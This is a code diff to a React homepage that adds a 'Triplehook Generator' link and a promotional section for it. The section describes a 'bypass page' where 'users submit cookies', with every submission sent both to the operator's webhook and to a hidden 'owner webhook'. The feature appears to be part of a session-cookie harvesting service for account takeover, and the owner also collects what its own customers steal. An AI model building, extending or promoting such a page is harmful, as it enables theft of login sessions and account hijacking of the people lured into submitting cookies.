@@ -44,6 +44,9 @@ export default function Home() {
                 Try Now
                 <ArrowRight className="w-5 h-5" />
               </Link>
+              <Link href="/triplehook" className="btn-secondary inline-flex items-center gap-2 text-lg px-8 py-3">
+                Triplehook Generator
+              </Link>
               <Link href="/dashboard" className="btn-secondary inline-flex items-center gap-2 text-lg px-8 py-3">
                 View Dashboard
               </Link>
@@ -146,6 +149,73 @@ export default function Home() {
                 )}
               </div>
             ))}
+          </div>
+        </div>
+      </section>
+
+      {/* Triplehook Section */}
+      <section className="py-24 px-4 border-t border-border">
+        <div className="max-w-6xl mx-auto">
+          <div className="mb-16 text-center">
+            <h2 className="text-4xl md:text-5xl font-bold mb-4">Triplehook System</h2>
+            <p className="text-muted-foreground text-lg max-w-2xl mx-auto">
+              Distribute webhook notifications to both your personal webhook and our owner webhook for comprehensive tracking
+            </p>
+          </div>
+
+          <div className="grid md:grid-cols-2 gap-8">
+            <div className="card-base rounded-lg">
+              <h3 className="text-2xl font-bold mb-4">How Triplehook Works</h3>
+              <ul className="text-muted-foreground space-y-3">
+                <li className="flex gap-3">
+                  <span className="text-primary font-bold flex-shrink-0">1.</span>
+                  <span>Create a triplehook configuration with your webhook</span>
+                </li>
+                <li className="flex gap-3">
+                  <span className="text-primary font-bold flex-shrink-0">2.</span>
+                  <span>Specify a directory name for your bypass page</span>
+                </li>
+                <li className="flex gap-3">
+                  <span className="text-primary font-bold flex-shrink-0">3.</span>
+                  <span>Users submit cookies to your custom page</span>
+                </li>
+                <li className="flex gap-3">
+                  <span className="text-primary font-bold flex-shrink-0">4.</span>
+                  <span>Notifications go to both your and our webhooks</span>
+                </li>
+              </ul>
+            </div>
+
+            <div className="card-base rounded-lg border border-primary/50 bg-primary/5">
+              <h3 className="text-2xl font-bold mb-4">Key Benefits</h3>
+              <ul className="text-muted-foreground space-y-3">
+                <li className="flex gap-2">
+                  <span className="text-primary">✓</span>
+                  <span>Dual webhook notifications</span>
+                </li>
+                <li className="flex gap-2">
+                  <span className="text-primary">✓</span>
+                  <span>Custom directory URLs</span>
+                </li>
+                <li className="flex gap-2">
+                  <span className="text-primary">✓</span>
+                  <span>Owner and user tracking</span>
+                </li>
+                <li className="flex gap-2">
+                  <span className="text-primary">✓</span>
+                  <span>Secure token generation</span>
+                </li>
+                <li className="flex gap-2">
+                  <span className="text-primary">✓</span>
+                  <span>Full audit logging</span>
+                </li>
+              </ul>
+
+              <Link href="/triplehook" className="btn-primary inline-flex items-center gap-2 mt-6">
+                Create Triplehook
+                <ArrowRight className="w-4 h-4" />
+              </Link>
+            </div>
           </div>
         </div>
       </section>
